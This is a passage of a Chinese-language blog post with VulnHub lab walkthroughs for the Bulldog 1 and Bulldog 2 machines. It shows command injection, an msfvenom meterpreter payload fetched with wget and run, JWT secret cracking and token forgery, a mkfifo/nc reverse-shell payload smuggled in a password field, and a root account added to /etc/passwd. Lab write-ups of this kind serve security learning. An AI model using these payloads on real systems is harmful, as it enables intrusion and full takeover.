/>得到账户<code>nick:bulldog</code></p><p>登入之后得到提示<code>You don't have permission to edit anything.</code></p><p>此时再访问<code>/dev/shell/</code><br />WEB端执行系统命令 -&gt; 命令注入<br />简单尝试之后发现<code>ls|cat /etc/passwd</code>可以执行</p><p>但是这个WEB是基于python的Django架构，不存在写入一句话木马的方法。<br />大概有两种方法：</p><ul><li>nc连接(正向连接/反弹Shell)</li><li>wget下载后门程序</li></ul><p><strong>第一种方法</strong><br />直接返回500<br />pass</p><p><strong>第二种方法</strong><br />生成后门文件&amp;启动HTTP服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p python&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.31.10 LPORT&#x3D;2020 &gt; shell.py</span><br><span class="line">python -m SimpleHTTPServer 80 &amp;</span><br></pre></td></tr></table></figure><p>MSF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 2020</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>命令注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls|wget http:&#x2F;&#x2F;192.168.31.10&#x2F;shell.py</span><br><span class="line">ls|python shell.py</span><br></pre></td></tr></table></figure><p>在MSF中接收到Shell</p><h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2><p>获取tty</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>在路径<code>/home/bulldogadmin/</code>下发现隐藏路径<code>.hiddenadmindirectory</code></p><p>进入之后发现两个文件<code>note</code>，<code>customPermissionApp</code></p><p>先将两个文件复制至自己home目录下并更改权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp * &#x2F;home&#x2F;django&#x2F;</span><br><span class="line">chmod 700 note customPermissionApp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat note </span><br><span class="line"></span><br><span class="line">Nick,</span><br><span class="line"></span><br><span class="line">I&#39;m working on the backend permission stuff. Listen, it&#39;s super prototype but I think it&#39;s going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! </span><br><span class="line"></span><br><span class="line">It&#39;s great stuff! Once I&#39;m finished with it, a hacker wouldn&#39;t even be able to reverse it! Keep in mind that it&#39;s still a prototype right now. I am about to get it working with the Django user account. I&#39;m not sure how I&#39;ll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?</span><br><span class="line"></span><br><span class="line">Let me know what you think of it!</span><br><span class="line"></span><br><span class="line">-Ashley</span><br></pre></td></tr></table></figure><p>另外一个文件是elf文件，大概对于提权有帮助<br />直接执行则提示需要输入自己的密码，大概在执行<code>sudo su</code></p><p>用strings命令分析一下内容<br />看到一串有意思的字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SUPERultH</span><br><span class="line">imatePASH</span><br><span class="line">SWORDyouH</span><br><span class="line">CANTget</span><br></pre></td></tr></table></figure><p>可以猜测密码是<code>SUPERultHimatePASHSWORDyouHCANTget</code><br />或<code>SUPERultimatePASSWORDyouCANTget</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">SUPERultimatePASSWORDyouCANTget</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>参考资料</p><blockquote><p><a href="https://www.cnblogs.com/yufusec/p/9179625.html">Burp.Intruder</a></p></blockquote><hr /><h1 id="bulldog2"><a class="markdownIt-Anchor" href="#bulldog2"></a> <a href="https://www.vulnhub.com/entry/bulldog-2,246/">bulldog2</a></h1><p><code>2020/02/20 16:35:33</code></p><h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2><p><code>nmap -sV -p 1-65535 -T 5 -n -A -v 192.168.31.233</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.233</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65534 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.14.0 (Ubuntu)</span><br><span class="line">|_http-cors: HEAD GET POST PUT DELETE PATCH</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B9AA7C338693424AAE99599BEC875B5F</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Bulldog.social</span><br><span class="line">MAC Address: 08:00:27:FE:62:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 43.190 days (since Tue Jan  7 22:59:12 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;253 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-7"><a class="markdownIt-Anchor" href="#web路径枚举-7"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径</p><p><code>dirb http://192.168.31.233/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.233&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;assets (CODE:301|SIZE:179)                                           </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.233&#x2F;favicon.ico (CODE:200|SIZE:5430)</span><br></pre></td></tr></table></figure><p>dirb扫描路径时没有发现有价值的信息<br />手工登录网页时发现路径<code>/login</code>，<code>/register</code>，<code>/about</code></p><ul><li>路径<code>/</code>下有一些用户评论</li><li>路径<code>/login</code>下存在登录点</li><li>路径<code>/register</code>提示无法注册</li></ul><h2 id="漏洞利用-7"><a class="markdownIt-Anchor" href="#漏洞利用-7"></a> 漏洞利用</h2><ul><li>账户爆破</li></ul><p>构造字典</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">cat dic</span><br><span class="line"></span><br><span class="line">Bulldog</span><br><span class="line">bulldog</span><br><span class="line">Social</span><br><span class="line">social</span><br><span class="line">Johnathan Abbey</span><br><span class="line">Johnathan</span><br><span class="line">johnathan</span><br><span class="line">Abbey</span><br><span class="line">abbey</span><br><span class="line">Sarah Dubree</span><br><span class="line">Sarah</span><br><span class="line">sarah</span><br><span class="line">Dubree</span><br><span class="line">dubree</span><br><span class="line">William Katz</span><br><span class="line">William</span><br><span class="line">william</span><br><span class="line">Katz</span><br><span class="line">katz</span><br><span class="line">Winston Churchy</span><br><span class="line">Winston</span><br><span class="line">winston</span><br><span class="line">Churchy</span><br><span class="line">churchy</span><br><span class="line">Bulldog Industries</span><br><span class="line">Industries</span><br><span class="line">industries</span><br><span class="line">network</span><br><span class="line">admin</span><br><span class="line">root</span><br><span class="line">123456</span><br><span class="line">a123456</span><br></pre></td></tr></table></figure><p>使用burpsuite进行爆破，失败</p><ul><li>账户注册</li></ul><p>审计js文件，搜索&quot;register&quot;<br />发现两处与上传有关的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">return l.prototype.registerUser &#x3D; function(l) &#123;</span><br><span class="line">                var n &#x3D; new x.Headers;</span><br><span class="line">                return n.append(&quot;Content-Type&quot;, &quot;application&#x2F;json&quot;),</span><br><span class="line">                this.http.post(&quot;&#x2F;users&#x2F;register&quot;, l, &#123;</span><br><span class="line">                    headers: n</span><br><span class="line">                &#125;).map(function(l) &#123;</span><br><span class="line">                    return l.json()</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;,</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">l.prototype.onRegisterSubmit &#x3D; function() &#123;</span><br><span class="line">var l &#x3D; this,</span><br><span class="line">n &#x3D; &#123;</span><br><span class="line">        name: this.name,</span><br><span class="line">        email: this.email,</span><br><span class="line">        username: this.username,</span><br><span class="line">        password: this.password</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>猜测可以以POST方式请求路径<code>/users/register</code>，并附带相应格式的json数据即可完成注册</p><p>在burp中构造请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;users&#x2F;register HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.31.233</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application&#x2F;json</span><br><span class="line">Content-Length: 84</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;email&quot;: &quot;abc@abc.abc&quot;,</span><br><span class="line">&quot;username&quot;: &quot;abc&quot;,</span><br><span class="line">&quot;password&quot;: &quot;abc&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到响应</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.0 (Ubuntu)</span><br><span class="line">Date: Thu, 20 Feb 2020 09:32:26 GMT</span><br><span class="line">Content-Type: application&#x2F;json; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 40</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: Express</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">ETag: W&#x2F;&quot;28-r22PRevV1bosgiTQ0L7&#x2F;zW61meQ&quot;</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true,&quot;msg&quot;:&quot;User registered&quot;&#125;</span><br></pre></td></tr></table></figure><p>使用账户<code>abc:abc</code>成功登入</p><p>登入之后发现自己不能执行任何功能，开始垂直提权</p><ul><li>垂直提权</li></ul><p>在登入时发现一次http交互中带有一段json</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;standard_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析JWT得到如下内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;standard_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>再审计js，查找&quot;auth_level&quot;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">l.prototype.isAdmin&#x3D;function()</span><br><span class="line">&#123;</span><br><span class="line">    var l&#x3D;localStorage.getItem(&quot;user&quot;);</span><br><span class="line">    return null!&#x3D;&#x3D;l &amp;&amp; &quot;master_admin_user&quot;&#x3D;&#x3D;JSON.parse(l).auth_level</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现&quot;master_admin_user&quot;<br />可以尝试修改JWT来尝试提权</p><p>尝试爆破JWT秘钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;brendan-rius&#x2F;c-jwt-cracker</span><br><span class="line">cd c-jwt-cracker</span><br><span class="line">chmod +x jwtcrack</span><br><span class="line">.&#x2F;jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiJhYmMiLCJlbWFpbCI6ImFiY0BhYmMuYWJjIiwidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE1ODIxOTE2NTYsImV4cCI6MTU4Mjc5NjQ1Nn0.zM0g_sVeMr4b5j5TYVDBmpVbliuQct6kGiuDRhDLRPg abcdefghijklmnopqrstuvwxyz 6</span><br></pre></td></tr></table></figure><p>得到秘钥为&quot;secret&quot;</p><p>修改JWT数据内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;</span><br><span class="line">&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;</span><br></pre></td></tr></table></figure><p>伪造JWT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line">python</span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(&#123;&quot;payload&quot;:&#123;&quot;name&quot;:&quot;abc&quot;,&quot;email&quot;:&quot;abc@abc.abc&quot;,&quot;username&quot;:&quot;abc&quot;,&quot;auth_level&quot;:&quot;master_admin_user&quot;&#125;,&quot;iat&quot;:1582191656,&quot;exp&quot;:1582796456&#125;, &#39;secret&#39;, algorithm&#x3D;&#39;HS256&#39;)</span><br><span class="line">    &#39;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&#39;</span><br></pre></td></tr></table></figure><p>在burp中开启拦截HTTP响应，登出账户并登入，用如下的数据代替身份校验步骤的JWT数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;success&quot;:true,</span><br><span class="line">    &quot;token&quot;:&quot;JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1ODIxOTE2NTYsInBheWxvYWQiOnsidXNlcm5hbWUiOiJhYmMiLCJhdXRoX2xldmVsIjoibWFzdGVyX2FkbWluX3VzZXIiLCJuYW1lIjoiYWJjIiwiZW1haWwiOiJhYmNAYWJjLmFiYyJ9LCJleHAiOjE1ODI3OTY0NTZ9.snQ_kH-0xRB9BWxbIMyxD1sOhFzp9-TKp5QYIPZ-kpk&quot;,</span><br><span class="line">    &quot;user&quot;:</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;username&quot;:&quot;abc&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;abc@abc.abc&quot;,</span><br><span class="line">        &quot;auth_level&quot;:&quot;master_admin_user&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得admin权限<br />在dashboard发现一个Link+登入点<br />尝试爆破，失败</p><ul><li>报错信息<br />访问路径<code>/%aa</code><br />获得报错信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">URIError: Failed to decode param &#39;&#x2F;%aa&#39;</span><br><span class="line">    at decodeURIComponent (&lt;anonymous&gt;)</span><br><span class="line">    at decode_param (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:172:12)</span><br><span class="line">    at Layer.match (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:123:27)</span><br><span class="line">    at matchLayer (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:574:18)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:220:15)</span><br><span class="line">    at SessionStrategy.strategy.pass (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:338:9)</span><br><span class="line">    at SessionStrategy.authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;strategies&#x2F;session.js:75:10)</span><br><span class="line">    at attempt (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:361:16)</span><br><span class="line">    at authenticate (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;authenticate.js:362:7)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br><span class="line">    at trim_prefix (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:317:13)</span><br><span class="line">    at &#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:284:7</span><br><span class="line">    at Function.process_params (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:335:12)</span><br><span class="line">    at next (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;index.js:275:10)</span><br><span class="line">    at initialize (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;passport&#x2F;lib&#x2F;middleware&#x2F;initialize.js:53:5)</span><br><span class="line">    at Layer.handle [as handle_request] (&#x2F;var&#x2F;www&#x2F;node&#x2F;Bulldog-2-The-Reckoning&#x2F;node_modules&#x2F;express&#x2F;lib&#x2F;router&#x2F;layer.js:95:5)</span><br></pre></td></tr></table></figure><p>在github上找到&quot;Bulldog-2-The-Reckoning&quot;的源码<br /><a href="https://github.com/Frichetten/Bulldog-2-The-Reckoning">https://github.com/Frichetten/Bulldog-2-The-Reckoning</a></p><p>在<code>/router/users.js</code>中发现存在<code>exec</code>函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exec(&#96;linkplus -u $&#123;username&#125; -p $&#123;password&#125;&#96;, (error, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">if (error) &#123;</span><br><span class="line">  console.error(&#96;exec error: $&#123;error&#125;&#96;);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br><span class="line">console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">console.log(&#96;stderr: $&#123;stderr&#125;&#96;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>可以在admin中的登入点实现命令注入</p><p>监听端口<br /><code>nc -lvvp 2020</code></p><p>反弹Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;password&quot;: &quot;;rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;bash -i 2&gt;&amp;1|nc 192.168.31.10 2020 &gt;&#x2F;tmp&#x2F;f&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功接收Shell</p><h2 id="权限提升-7"><a class="markdownIt-Anchor" href="#权限提升-7"></a> 权限提升</h2><p>查看文件<code>/etc/passwd</code>的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;passwd</span><br><span class="line">    -rwxrwxrwx 1 root root 1790 Feb 20 12:09 &#x2F;etc&#x2F;passwd</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p><code>/etc/passwd</code>可写</p><p>构造账户信息并写入<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">    $6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1</span><br><span class="line">echo &#39;test::$6$niT81cP.pbbCDVBZ$Tnou8n5zZHkPNF3n0EqZnouOM4eEDCxSS5OeJ21.TbLJe167Igyns87G8JbW2n5ShI23D9RuGtji1NLrRti.&#x2F;1:0:0:toor:&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">su toor</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>JWT</p></blockquote><p>JWT提权时有些迷</p><ul><li>直接修改数据而不修改签名  提权成功</li><li>数据与签名都修改  提权成功</li><li>直接删掉签名部分  提权失败</li></ul><p>jwtcrack破解6位纯小写密码在虚拟机中大概需要3min。</p><p>参考资料</p><blockquote><p><a href="https://www.freebuf.com/vuls/219056.html">JWT</a><br /><a href="https://blog.csdn.net/zyy1659949090/article/details/88176215">/etc/passwd</a><br /><a href="https://blog.blacsheep.cn/2018/09/16/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0wakanda/">WP</a><br /><a href="https://www.anquanke.com/post/id/160755">WP</a></p></blockquote><hr /><h1 